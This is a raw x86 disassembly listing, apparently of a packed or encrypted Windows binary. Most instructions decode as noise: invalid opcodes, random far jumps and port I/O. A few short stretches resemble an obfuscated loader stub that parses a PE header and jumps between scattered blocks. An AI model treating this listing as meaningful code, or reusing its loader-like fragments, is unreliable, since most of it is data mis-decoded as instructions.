  40fe92:	dec    esp
  40fe93:	repnz xor DWORD PTR [eax-0x2c],ecx
  40fe97:	inc    eax
  40fe98:	add    ecx,esp
  40fe9a:	ret    0x2333
  40fe9d:	or     DWORD PTR [edi-0x624ab076],0xfffffff6
  40fea4:	mov    al,BYTE PTR [esi+0x6]
  40fea7:	adc    al,0xe1
  40fea9:	dec    ecx
  40feaa:	dec    ebp
  40feab:	rol    DWORD PTR [eax+0x29],cl
  40feae:	mov    al,ds:0xe0694119
  40feb3:	adc    eax,0xa413a387
  40feb8:	or     BYTE PTR [ecx+0x7cd0c031],ch
  40febe:	cmp    BYTE PTR [edi],ah
  40fec0:	fstp   QWORD PTR [ebx+0x17813417]
  40fec6:	push   edi
  40fec7:	jbe    0x40fecf
  40fec9:	fist   WORD PTR [eax+edx*2-0x4f78f29b]
  40fed0:	adc    ebx,DWORD PTR [esi-0x75932d02]
  40fed6:	mov    ebx,0xe0331419
  40fedc:	pop    ds
  40fedd:	push   ebx
  40fede:	mov    ds:0xa07fe788,al
  40fee3:	add    esi,DWORD PTR [ebp-0x66]
  40fee6:	cli    
  40fee7:	jae    0x40ff53
  40fee9:	pushf  
  40feea:	repz cli 
  40feec:	xchg   cl,bh
  40feee:	and    bh,ch
  40fef0:	ds dec ebp
  40fef2:	mov    ecx,0x9eb739ef
  40fef7:	(bad)  
  40fef9:	sbb    BYTE PTR [edx],ch
  40fefb:	pop    esp
  40fefc:	cmp    eax,0x8cf6bbd7
  40ff01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff02:	ins    DWORD PTR es:[edi],dx
  40ff03:	(bad)  
  40ff04:	jg     0x40ff45
  40ff06:	cmp    BYTE PTR [eax+0x74],bl
  40ff09:	inc    esp
  40ff0a:	xchg   ebx,eax
  40ff0b:	cwde   
  40ff0c:	dec    edx
  40ff0d:	loope  0x40ff30
  40ff0f:	int    0xcd
  40ff11:	fild   DWORD PTR [edi-0x51]
  40ff14:	fcom   QWORD PTR [esi-0xd503b80]
  40ff1a:	dec    ebx
  40ff1b:	xor    BYTE PTR [edi],bh
  40ff1d:	outs   dx,BYTE PTR ds:[esi]
  40ff1e:	ret    0x16c2
  40ff21:	sub    ch,BYTE PTR [edx]
  40ff23:	jge    0x40ff53
  40ff25:	loopne 0x40ff23
  40ff27:	jb     0x40ff25
  40ff29:	jmp    0x40ff04
  40ff2b:	push   edi
  40ff2c:	dec    ebx
  40ff2d:	mov    bl,0x5f
  40ff2f:	cwde   
  40ff30:	mov    bh,0x84
  40ff32:	loop   0x40fee5
  40ff34:	mov    ebp,0x123eae1e
  40ff39:	mov    al,0x16
  40ff3b:	je     0x40ff61
  40ff3d:	sbb    ebp,ebx
  40ff3f:	xchg   esi,eax
  40ff40:	adc    al,0xd6
  40ff42:	xchg   edi,eax
  40ff43:	popf   
  40ff44:	(bad)  
  40ff46:	mov    eax,ds:0xabc03e30
  40ff4b:	jb     0x40ffc5
  40ff4d:	cmp    ebp,ecx
  40ff4f:	leave  
  40ff50:	push   ebp
  40ff51:	cli    
  40ff52:	dec    edx
  40ff53:	call   0x8b4e:0x3578df37
  40ff5a:	(bad)  
  40ff5b:	popa   
  40ff5c:	pop    ebx
  40ff5d:	mov    edx,0xd2440cd6
  40ff62:	clc    
  40ff63:	or     al,cl
  40ff65:	in     al,0x6e
  40ff67:	cmp    edi,edx
  40ff69:	push   0xfc45c7f3
  40ff6e:	xor    DWORD PTR [ebp+0x458bf89c],eax
  40ff74:	or     BYTE PTR [edx+0x3405c700],cl
  40ff7a:	loope  0x40ffbe
  40ff7c:	add    BYTE PTR [edx],bh
  40ff7e:	cmp    al,BYTE PTR [eax]
  40ff80:	add    BYTE PTR [edi+esi*1],al
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	xchg   ebp,eax
  40ffdd:	popf   
  40ffde:	aad    0xb2
  40ffe0:	xor    eax,0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x40ffca
  40ffe9:	cmp    esp,edx
  40ffeb:	or     edx,DWORD PTR [eax+edx*8-0x37]
  40ffef:	test   al,0xfd
  40fff1:	xlat   BYTE PTR ds:[ebx]
  40fff2:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40fff4:	xor    bh,dl
  40fff6:	or     edi,edi
  40fff8:	shr    BYTE PTR [esi+0x1b],0xfb
  40fffc:	into   
  40fffd:	pop    edx
  40fffe:	add    eax,0x8dbb006
  410003:	or     DWORD PTR [ecx+0x32801b8],esi
  410009:	jbe    0x40ffbc
  41000b:	jp     0x40ffa3
  41000d:	jnp    0x40ff93
  41000f:	mov    WORD PTR [eax+0x5a1d7605],?
  410015:	outs   dx,DWORD PTR ds:[esi]
  410016:	ds jge 0x41000f
  410019:	aaa    
  41001a:	fnsave [edx]
  41001c:	dec    edx
  41001d:	push   0x55
  41001f:	lahf   
  410020:	enter  0xca13,0xba
  410024:	pop    ss
  410025:	and    eax,0xa4b1fb7d
  41002a:	and    DWORD PTR ds:0x3165cbb3,esi
  410030:	pusha  
  410031:	ror    DWORD PTR [eax-0x3658ad8e],1
  410037:	mov    ecx,0x1afa296e
  41003c:	push   ss
  41003d:	sahf   
  41003e:	aam    0x15
  410040:	in     al,dx
  410041:	and    eax,0x1b8dac5b
  410046:	push   ebx
  410047:	cdq    
  410048:	sbb    al,0x9f
  41004a:	push   edi
  41004b:	inc    edi
  41004c:	sub    BYTE PTR [edx],dh
  41004e:	sbb    eax,0xb05dabee
  410053:	sub    cl,cl
  410055:	cs fwait
  410057:	xchg   edx,eax
  410058:	push   esi
  410059:	xor    DWORD PTR [edx],edi
  41005b:	mov    dl,0x75
  41005d:	je     0x41004c
  41005f:	cmp    al,0xf5
  410061:	fisttp QWORD PTR [edi+0x4fee3aaf]
  410067:	ds hlt 
  410069:	mov    ebx,0xef2ddb9c
  41006e:	ret    
  41006f:	dec    esp
  410070:	sbb    bh,al
  410072:	fwait
  410073:	push   eax
  410074:	scas   eax,DWORD PTR es:[edi]
  410075:	ins    BYTE PTR es:[edi],dx
  410076:	aaa    
  410077:	imul   edi,DWORD PTR [ebx-0x44092760],0xffffffe0
  41007e:	repz shl DWORD PTR [edi-0x5410b0ca],cl
  410085:	add    ebx,DWORD PTR [ebx+0x42]
  410088:	cmp    ebp,DWORD PTR [edx-0x3a621235]
  41008e:	popa   
  41008f:	sub    DWORD PTR [ebx],0x189c2d2a
  410095:	inc    ecx
  410096:	test   al,0x70
  410098:	cmp    al,0x6f
  41009a:	inc    eax
  41009b:	jp     0x410076
  41009d:	push   ebp
  41009e:	add    BYTE PTR [eax+eax*2],0xa5
  4100a2:	retf   0x1239
  4100a5:	lods   al,BYTE PTR ds:[esi]
  4100a6:	cli    
  4100a7:	out    0x5,al
  4100a9:	das    
  4100aa:	dec    ecx
  4100ab:	cmp    al,0x92
  4100ad:	(bad)  
  4100ae:	push   edi
  4100af:	and    al,BYTE PTR [ecx]
  4100b1:	out    0x8f,eax
  4100b3:	mov    edx,0xe8da0826
  4100b8:	pop    ebx
  4100b9:	push   ebx
  4100ba:	xchg   ecx,eax
  4100bb:	xor    eax,0xaf463402
  4100c0:	xchg   ecx,eax
  4100c1:	push   cs
  4100c2:	scas   eax,DWORD PTR es:[edi]
  4100c3:	retf   
  4100c4:	in     al,dx
  4100c5:	test   eax,0x49013585
  4100ca:	inc    ecx
  4100cb:	ret    0xf279
  4100ce:	int3   
  4100cf:	pop    ebx
  4100d0:	scas   al,BYTE PTR es:[edi]
  4100d1:	sbb    al,0xfa
  4100d3:	jl     0x4100c1
  4100d5:	or     ebx,DWORD PTR [edi]
  4100d7:	mov    bl,0x3b
  4100d9:	pop    ebx
  4100da:	aaa    
  4100db:	pusha  
  4100dc:	call   0xdbc4:0x4ce98c02
  4100e3:	mov    ch,0x7d
  4100e5:	push   esi
  4100e6:	jmp    0xa77a8e2d
  4100eb:	and    BYTE PTR [edx+0x6f1a09b1],bh
  4100f1:	xor    ecx,0xffffff95
  4100f4:	les    eax,FWORD PTR ds:0xc0cb6be5
  4100fa:	mov    ebp,0xb4a26058
  4100ff:	xor    DWORD PTR [ebp+0x42],ecx
  410102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410103:	in     eax,0x5a
  410105:	fmul   DWORD PTR [ebp+ecx*8-0x2d]
  410109:	mov    ch,0x1b
  41010b:	inc    ebx
  41010c:	lods   al,BYTE PTR ds:[esi]
  41010d:	shr    edx,cl
  41010f:	out    0xf,eax
  410111:	sbb    al,dh
  410113:	inc    ebx
  410114:	ins    DWORD PTR es:[edi],dx
  410115:	add    DWORD PTR [edx],ecx
  410117:	sub    eax,DWORD PTR [ecx]
  410119:	popa   
  41011a:	aaa    
  41011b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41011c:	in     al,0x2d
  41011e:	inc    edi
  41011f:	and    eax,eax
  410121:	js     0x410147
  410123:	jno    0x41015f
  410125:	outs   dx,BYTE PTR ds:[esi]
  410126:	pushf  
  410127:	add    dl,0x12
  41012a:	lods   al,BYTE PTR ds:[esi]
  41012b:	bt     DWORD PTR [eax+ecx*4+0x21],ebx
  410130:	xor    esi,esi
  410132:	test   eax,0x76293214
  410137:	jne    0x4100c6
  410139:	(bad)  
  41013a:	fidivr WORD PTR [esi]
  41013c:	mov    cl,BYTE PTR ds:0x3eebcdb
  410142:	jb     0x4100f5
  410144:	imul   ecx,DWORD PTR [edx-0x4f4dd252],0xa704f0ef
  41014e:	aam    0xc9
  410150:	sbb    eax,0x1d71bacc
  410155:	(bad)  
  410156:	adc    edi,DWORD PTR [edx]
  410158:	mov    WORD PTR [edi+0x68e67f98],gs
  41015e:	fsubp  st(4),st
  410160:	inc    esp
  410161:	cld    
  410162:	push   ebx
  410163:	pop    ecx
  410164:	mov    ch,0x8d
  410166:	sbb    esi,edi
  410168:	xor    eax,0xb96e3c80
  41016d:	cli    
  41016e:	sub    dh,ah
  410170:	sbb    esi,esi
  410172:	mov    edi,0xe1ced301
  410177:	dec    edi
  410178:	in     eax,0x42
  41017a:	out    dx,eax
  41017b:	jecxz  0x4101d0
  41017d:	push   esp
  41017e:	daa    
  41017f:	pop    es
  410180:	mov    ecx,0xa99ccedc
  410185:	add    bl,BYTE PTR [ecx]
  410187:	cmp    al,0x78
  410189:	std    
  41018a:	stos   BYTE PTR es:[edi],al
  41018b:	lods   al,BYTE PTR ds:[esi]
  41018c:	adc    dh,BYTE PTR ds:0x80095991
  410192:	add    BYTE PTR [esi+0x5f],0x6
  410196:	mov    al,BYTE PTR [ebx]
  410198:	imul   DWORD PTR [eax+0x284d2d90]
  41019e:	popf   
  41019f:	mov    edi,0x12695e09
  4101a4:	sub    BYTE PTR [eax+0x3d],0xf4
  4101a8:	(bad)  
  4101a9:	rcl    BYTE PTR [edi+0x144bbeb5],0xa0
  4101b0:	cmp    BYTE PTR [ebx-0x9],bh
  4101b3:	and    eax,0xe4d61333
  4101b8:	repnz push ds
  4101ba:	pop    ebx
  4101bb:	jmp    0xce40:0x639cc2f4
  4101c2:	ficom  WORD PTR [ebp+0x5e53fbfd]
  4101c8:	bnd jg 0x410182
  4101cb:	jmp    0x200ab786
  4101d0:	jno    0x410189
  4101d2:	aaa    
  4101d3:	or     DWORD PTR [ebx+0x282dc1ac],esi
  4101d9:	cs cmp eax,0xb1886ccd
  4101df:	and    al,0xe1
  4101e1:	jnp    0x4101d3
  4101e3:	fs jb  0x4101c4
  4101e6:	xchg   ebx,eax
  4101e7:	rol    ecx,cl
  4101e9:	in     al,dx
  4101ea:	cmp    BYTE PTR [ebp+0x201bfbfc],0xfc
  4101f1:	retf   
  4101f2:	sub    DWORD PTR [esi+edi*1],ebx
  4101f5:	fmulp  st(6),st
  4101f7:	dec    edx
  4101f8:	pop    ebp
  4101f9:	icebp  
  4101fa:	mov    dh,0xfe
  4101fc:	popa   
  4101fd:	(bad)  
  4101fe:	(bad)  
  4101ff:	mov    ecx,0x130d41a5
  410204:	bound  edi,QWORD PTR [ebp+0x4b]
  410207:	fstp   TBYTE PTR [ebx-0x695b504a]
  41020d:	xchg   esp,eax
  41020e:	out    0x45,al
  410210:	jne    0x410252
  410212:	xor    dh,dl
  410214:	xor    dl,dh
  410216:	das    
  410217:	mov    cl,0xe8
  410219:	xchg   BYTE PTR [ecx+0x2e5c85c6],bh
  41021f:	add    al,0xa3
  410221:	(bad)  
  410222:	and    DWORD PTR [edx],ebp
  410224:	push   0x692acefb
  410229:	fs pop ecx
  41022b:	iret   
  41022c:	jne    0x41022c
  41022e:	(bad)  
  41022f:	call   0x4cdb:0xb78e8ed4
  410236:	call   0x152b:0x2d34f4f
  41023d:	jmp    0x4102a4
  41023f:	mov    edx,0x966a45c9
  410244:	mov    cl,BYTE PTR [eax+0x6b]
  410247:	push   esp
  410248:	jae    0x41026a
  41024a:	in     eax,0xb4
  41024c:	cld    
  41024d:	cdq    
  41024e:	push   esi
  41024f:	retf   
  410250:	ss mov ah,0x9f
  410253:	and    BYTE PTR [ebx-0x2e],cl
  410256:	jmp    0x5b4e:0xe957993f
  41025d:	std    
  41025e:	das    
  41025f:	mov    ecx,?
  410261:	retf   0x7c74
  410264:	sbb    bh,dl
  410266:	fwait
  410267:	and    cl,BYTE PTR [ecx+0x1f]
  41026a:	and    ch,BYTE PTR [ebp-0x1f]
  41026d:	inc    edi
  41026e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41026f:	add    ah,BYTE PTR [esp+ecx*8+0x6bea084]
  410276:	aam    0xa6
  410278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410279:	and    ecx,DWORD PTR [eax+ebp*1+0x6cbacb59]
  410280:	jb     0x41020b
  410282:	data16 cmc 
  410284:	fsubr  QWORD PTR [esi+0xa85656f]
  41028a:	shl    eax,0x6c
  41028d:	sub    dl,BYTE PTR [esi]
  41028f:	cs push 0x2cbe8406
  410295:	mov    dl,0x85
  410297:	mov    ebx,0x187c8f58
  41029c:	btc    esi,eax
  41029f:	test   BYTE PTR [edi+0x15a7e011],ch
  4102a5:	daa    
  4102a6:	cs push es
  4102a8:	jp     0x4102cc
  4102aa:	adc    bl,BYTE PTR [eax+0x51029b4b]
  4102b0:	in     eax,0x13
  4102b2:	inc    DWORD PTR ds:0xf5efa84c
  4102b8:	adc    esp,ebp
  4102ba:	shl    DWORD PTR [esi],1
  4102bc:	mov    ah,0xee
  4102be:	nop
  4102bf:	mov    bh,dl
  4102c1:	mov    edi,0xe13ff9f0
  4102c6:	sbb    edi,DWORD PTR [edi]
  4102c8:	imul   BYTE PTR [eax]
  4102ca:	jg     0x41026c
  4102cc:	int3   
  4102cd:	into   
  4102ce:	and    dl,BYTE PTR [edi-0x67]
  4102d1:	mov    eax,ds:0x233bc518
  4102d6:	add    BYTE PTR [ecx],bl
  4102d8:	or     eax,0x6f76d814
  4102dd:	popf   
  4102de:	pusha  
  4102df:	enter  0x9141,0xe7
  4102e3:	push   ds
  4102e4:	out    0xc,eax
  4102e6:	mov    esi,0xd6720552
  4102eb:	sbb    dh,BYTE PTR [ebp-0x4c80eeb4]
  4102f1:	imul   esp,ecx,0xffffffdb
  4102f4:	inc    ecx
  4102f5:	jmp    0x541755e0
  4102fa:	int3   
  4102fb:	xlat   BYTE PTR ds:[ebx]
  4102fc:	xor    eax,DWORD PTR [esp+eax*8+0x24]
  410300:	sahf   
  410301:	fwait
  410302:	or     al,0xc7
  410304:	ss push ebx
  410306:	inc    esi
  410307:	imul   esi,DWORD PTR [ecx-0x65f69ed3],0x79c0bed4
  410311:	jno    0x4102bb
  410313:	je     0x4102f3
  410315:	push   es
  410316:	enter  0x7c38,0x16
  41031a:	js     0x41031e
  41031c:	add    DWORD PTR [esi-0x24fbb807],ecx
  410322:	push   ss
  410323:	adc    BYTE PTR [esi+edx*1+0x4a9f684b],ch
  41032a:	(bad)  
  41032c:	or     eax,0xa109de4d
  410331:	std    
  410332:	push   es
  410333:	les    ecx,FWORD PTR [edx+eiz*4+0x94359dd]
  41033a:	cmp    al,0xd5
  41033c:	mov    edi,0xcd00e021
  410341:	and    al,BYTE PTR [edi]
  410343:	or     eax,esp
  410345:	daa    
  410346:	clc    
  410347:	sbb    esp,DWORD PTR ds:0xd2d9420d
  41034d:	xchg   dl,cl
  41034f:	mov    ch,0xf7
  410351:	push   edi
  410352:	pop    ss
  410353:	loopne 0x4102e5
  410355:	stc    
  410356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410357:	fnsave [esi+0x77]
  41035a:	shr    DWORD PTR [edi-0xb5db48],cl
  410360:	xchg   esp,eax
  410361:	sub    DWORD PTR [esi*4+0x12b5d35],edx
  410368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410369:	sub    eax,edi
  41036b:	out    dx,al
  41036c:	das    
  41036d:	cld    
  41036e:	hlt    
  41036f:	sub    dl,BYTE PTR [esi]
  410371:	push   ebx
  410372:	stc    
  410373:	ds jo  0x410350
  410376:	mov    edi,0xfd33ae37
  41037b:	out    0xb1,al
  41037d:	pop    ebp
  41037e:	clc    
  41037f:	dec    esi
  410380:	mov    dh,0x2d
  410382:	or     al,0xed
  410384:	pop    ds
  410385:	int    0x65
  410387:	and    dh,BYTE PTR [ebp-0x1]
  41038a:	mov    eax,0x5dd45a6c
  41038f:	push   ebp
  410390:	mov    ah,ch
  410392:	retf   0x8b63
  410395:	mov    DWORD PTR [ebp+0x8],ecx
  410398:	add    eax,0x2082
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd05
  4103a6:	add    ecx,DWORD PTR ds:0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x27bf:0xdeadbab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	pop    ebp
  4103db:	jbe    0x410427
  4103dd:	ins    DWORD PTR es:[edi],dx
  4103de:	aam    0xa4
  4103e0:	inc    edi
  4103e1:	push   ebx
  4103e2:	xchg   ebx,eax
  4103e3:	data16 adc dl,cl
  4103e6:	mov    ch,0xfc
  4103e8:	inc    ebx
  4103e9:	daa    
  4103ea:	ror    ah,1
  4103ec:	and    eax,0x9e0653a4
  4103f1:	sub    DWORD PTR [ebx-0x67],0x3186c92b
  4103f8:	mov    ecx,0x161a0d8b
  4103fd:	jnp    0x4103a1
  4103ff:	xchg   edi,eax
  410400:	add    ecx,ecx
  410402:	repz fcmovnb st,st(7)
  410405:	mov    edx,0x266b6314
  41040a:	mov    esi,0x2ff12551
  41040f:	sbb    eax,0xd13640e2
  410414:	push   ecx
  410415:	xor    BYTE PTR [ecx+edx*4],bh
  410418:	mov    dh,0x33
  41041a:	shr    BYTE PTR [ebx-0x3b],0xd7
  41041e:	sbb    ch,BYTE PTR [ebx+eiz*4]
  410421:	mov    ah,0x6f
  410423:	fistp  QWORD PTR [ebx]
  410425:	jno    0x4103cd
  410427:	scas   eax,DWORD PTR es:[edi]
  410428:	mov    al,ds:0x914352a0
  41042d:	mov    eax,0x610efc44
  410432:	(bad)  
  410433:	and    edi,DWORD PTR [ebx+0x6f]
  410436:	fucomi st,st(1)
  410438:	mov    BYTE PTR [edx+0x40],dh
  41043b:	push   edx
  41043c:	jmp    0x4103ef
  41043e:	lock loopne 0x410465
  410441:	in     eax,dx
  410442:	sti    
  410443:	xchg   ecx,eax
  410444:	fsub   DWORD PTR [esi]
  410446:	mov    esp,0xee53685
  41044b:	inc    edi
  41044c:	add    eax,0x42aca7bb
  410451:	ret    
  410452:	cdq    
  410453:	mov    dl,0xbf
  410455:	pop    edi
  410456:	adc    eax,0xb4e2444
  41045b:	jno    0x4104b4
  41045d:	mov    ecx,0xcd9feacf
  410462:	xchg   edi,eax
  410463:	add    bl,bl
  410465:	sub    DWORD PTR [esi+0xc4be098],ebx
  41046b:	fist   WORD PTR [esi+eax*2]
  41046e:	fist   DWORD PTR [esi-0x14]
  410471:	and    DWORD PTR [edi+0x15d6fc41],ecx
  410477:	adc    ch,BYTE PTR [edx+0x245917f]
  41047d:	out    0x32,al
  41047f:	scas   al,BYTE PTR es:[edi]
  410480:	in     eax,0x79
  410482:	push   cs
  410483:	xlat   BYTE PTR ds:[ebx]
  410484:	or     cl,BYTE PTR [esi+0x7f0f8ca2]
  41048a:	push   eax
  41048b:	das    
  41048c:	fidivr WORD PTR [eax+0x12]
  41048f:	or     al,0x5c
  410491:	ds mov ah,0xb2
  410494:	arpl   si,di
  410496:	icebp  
  410497:	ret    0x7e14
  41049a:	sahf   
  41049b:	lock scas al,BYTE PTR es:[edi]
  41049d:	jg     0x410475
  41049f:	out    0xda,eax
  4104a1:	out    0x41,al
  4104a3:	(bad)  
  4104a4:	cwde   
  4104a5:	ja     0x410465
  4104a7:	and    bh,bl
  4104a9:	jo     0x410467
  4104ab:	lea    ebx,[edi-0x54]
  4104ae:	sbb    dl,bh
  4104b0:	test   al,0x39
  4104b2:	dec    esp
  4104b3:	aad    0x37
  4104b5:	loopne 0x410473
  4104b7:	mov    ds:0x78316805,eax
  4104bc:	push   edi
  4104bd:	and    ebp,DWORD PTR [ebp-0x51]
  4104c0:	lods   eax,DWORD PTR ds:[esi]
  4104c1:	xor    DWORD PTR [eax-0x4953e71d],ebp
  4104c7:	pop    esi
  4104c8:	daa    
  4104c9:	sahf   
  4104ca:	shl    BYTE PTR [ecx+0x1f28da5d],cl
  4104d0:	(bad)  
  4104d1:	call   0xde18:0xd3c74d4e
  4104d8:	out    dx,eax
  4104d9:	int3   
  4104da:	ins    BYTE PTR es:[edi],dx
  4104db:	adc    esi,DWORD PTR ds:0xbfb7d30a
  4104e1:	int    0x1f
  4104e3:	xchg   ecx,eax
  4104e4:	inc    DWORD PTR [edx+0x5620bab1]
  4104ea:	cmc    
  4104eb:	and    DWORD PTR ds:0x37cf9be7,esp
  4104f1:	sub    al,0x91
  4104f3:	mov    edx,0x4dfd31a5
  4104f8:	into   
  4104f9:	sahf   
  4104fa:	enter  0x7866,0x1b
  4104fe:	cmp    edx,eax
  410500:	push   esi
  410501:	push   cs
  410502:	scas   eax,DWORD PTR es:[edi]
  410503:	mov    ch,0x70
  410505:	mov    WORD PTR [eax],es
  410507:	jae    0x4104cb
  410509:	mov    dl,0xf4
  41050b:	fsubr  DWORD PTR [ecx+0x5ecdbffe]
  410511:	imul   ecx,DWORD PTR [esi+0x45],0x4fb9d43d
  410518:	(bad)  
  410519:	mov    ecx,0xf8e88cb5
  41051e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41051f:	sub    BYTE PTR [ecx+0x301626f8],dh
  410525:	out    dx,al
  410526:	lock outs dx,DWORD PTR ds:[esi]
  410528:	repnz gs pop edx
  41052b:	mov    ebx,DWORD PTR [edi]
  41052d:	fwait
  41052e:	es push ebx
  410530:	aad    0x93
  410532:	cmp    DWORD PTR [edx+0x3b764ee3],ebp
  410538:	cwde   
  410539:	aam    0x99
  41053b:	cmp    eax,0x8ea44a2f
  410540:	sub    bl,cl
  410542:	or     al,0x6b
  410544:	ins    DWORD PTR es:[edi],dx
  410545:	inc    ebp
  410546:	cli    
  410547:	cli    
  410548:	cdq    
  410549:	cmp    eax,esp
  41054b:	sub    BYTE PTR [esi+0x5d],dh
  41054e:	mov    edx,0x98d69ec5
  410553:	dec    edx
  410554:	jae    0x4104e5
  410556:	adc    al,0xd0
  410558:	push   ebp
  410559:	mov    al,bh
  41055b:	xlat   BYTE PTR ds:[ebx]
  41055c:	stc    
  41055d:	push   ebx
  41055e:	jge    0x4105b4
  410560:	jb     0x4105dd
  410562:	scas   eax,DWORD PTR es:[edi]
  410563:	push   ds
  410564:	std    
  410565:	sbb    edi,DWORD PTR [edi-0x11]
  410568:	xor    ebx,ebp
  41056a:	mov    ch,0xd2
  41056c:	int3   
  41056d:	shl    BYTE PTR [ebp-0x37cf8c00],cl
  410573:	mov    ebx,0xd893c761
  410578:	dec    esi
  410579:	pop    es
  41057a:	mov    ecx,ds
  41057c:	jg     0x4105a7
  41057e:	add    ebp,DWORD PTR ds:[ecx+ebx*8+0x4e]
  410583:	es ja  0x410571
  410586:	(bad)  
  410587:	adc    ah,BYTE PTR [ecx+0x6564d5b]
  41058d:	push   ebp
  41058e:	dec    esi
  41058f:	mov    bh,0x37
  410591:	adc    DWORD PTR [ecx],ecx
  410593:	out    dx,al
  410594:	into   
  410595:	adc    BYTE PTR [eax+ebx*8-0x5eadb99d],cl
  41059c:	push   ebx
  41059d:	and    ch,BYTE PTR [esi+0x3eff701e]
  4105a3:	loope  0x4105cd
  4105a5:	out    dx,al
  4105a6:	icebp  
  4105a7:	repnz sahf 
  4105a9:	mov    dl,0xff
  4105ab:	add    al,0xd2
  4105ad:	inc    eax
  4105ae:	push   ebp
  4105af:	xor    cl,BYTE PTR [ecx-0x3a]
  4105b2:	fidivr DWORD PTR [ebp+eiz*4-0x58fcbb48]
  4105b9:	repz adc cl,BYTE PTR [esi]
  4105bc:	loopne 0x410555
  4105be:	ins    DWORD PTR es:[edi],dx
  4105bf:	cmp    cl,BYTE PTR [edi-0x28666b30]
  4105c5:	xchg   edx,eax
  4105c6:	repz lds edx,FWORD PTR [edx+0x2f]
  4105ca:	sar    BYTE PTR [esi],1
  4105cc:	mov    bl,0x40
  4105ce:	mov    ebx,0xaedf8882
  4105d3:	scas   eax,DWORD PTR es:[edi]
  4105d4:	jb     0x410640
  4105d6:	xchg   esp,eax
  4105d7:	push   ebp
  4105d8:	test   DWORD PTR [esi-0xf],edx
  4105db:	jne    0x4105f7
  4105dd:	jbe    0x41061c
  4105df:	shl    DWORD PTR [ebx+0x68],0x10
  4105e3:	and    al,cl
  4105e5:	mov    ecx,0xbff111a8
  4105ea:	stc    
  4105eb:	lods   al,BYTE PTR ds:[esi]
  4105ec:	add    eax,0x5edacb80
  4105f1:	push   edx
  4105f2:	add    al,0x89
  4105f4:	sub    eax,0xd0dc0329
  4105f9:	loop   0x4105c6
  4105fb:	push   ebp
  4105fc:	and    bh,BYTE PTR [edx-0x2e69fdf3]
  410602:	addr16 dec ebx
  410604:	sbb    ecx,ecx
  410606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410607:	pop    ss
  410608:	in     eax,0xf1
  41060a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41060b:	pop    eax
  41060c:	fs rcr ch,0x7a
  410610:	or     eax,0xfd08b956
  410615:	in     al,dx
  410616:	mov    BYTE PTR [edx+0x1d],ch
  410619:	pop    eax
  41061a:	adc    al,0xcb
  41061c:	push   edx
  41061d:	rol    ah,cl
  41061f:	jl     0x410697
  410621:	ja     0x410642
  410623:	or     eax,0x64773fe7
  410628:	or     dl,BYTE PTR [eax-0x61]
  41062b:	jmp    0xf2ec:0x98706702
  410632:	cld    
  410633:	cmp    DWORD PTR [ebx-0x7e],ecx
  410636:	daa    
  410637:	jmp    0x410676
  410639:	mov    ah,0x0
  41063b:	loop   0x410699
  41063d:	pop    ss
  41063e:	js     0x4106bf
  410640:	pop    es
  410641:	xlat   BYTE PTR ds:[ebx]
  410642:	ja     0x410612
  410644:	fwait
  410645:	scas   eax,DWORD PTR es:[edi]
  410646:	mov    WORD PTR [ecx],?
  410648:	scas   eax,DWORD PTR es:[edi]
  410649:	aad    0x92
  41064b:	inc    edi
  41064c:	sbb    al,0xf
  41064e:	lea    ecx,[ebx-0x19166d4a]
  410654:	mov    edx,edi
  410656:	mov    ch,BYTE PTR gs:[ecx+0x636ec0d4]
  41065d:	neg    DWORD PTR [edx-0x4e]
  410660:	arpl   WORD PTR [ebx-0x35],si
  410663:	out    0x1a,eax
  410665:	or     BYTE PTR [eax],ch
  410667:	sub    BYTE PTR [eax+0x66ee79c8],cl
  41066d:	inc    ecx
  41066e:	je     0x410621
  410670:	pop    esp
  410671:	push   ebp
  410672:	sub    eax,0x5bd966f2
  410677:	in     al,0xfe
  410679:	inc    esp
  41067a:	inc    edi
  41067b:	push   es
  41067c:	sub    al,0x21
  41067e:	inc    edx
  41067f:	xor    al,0xe3
  410681:	dec    esi
  410682:	int    0x5e
  410684:	mov    BYTE PTR [esi+0x50],ch
  410687:	std    
  410688:	and    al,0x95
  41068a:	adc    dh,BYTE PTR [edi]
  41068c:	cmp    DWORD PTR [edi-0x362c0fe4],esi
  410692:	cmc    
  410693:	add    al,0x78
  410695:	popa   
  410696:	fld    QWORD PTR [eax+0x2]
  410699:	or     BYTE PTR [ebx+0x8],ah
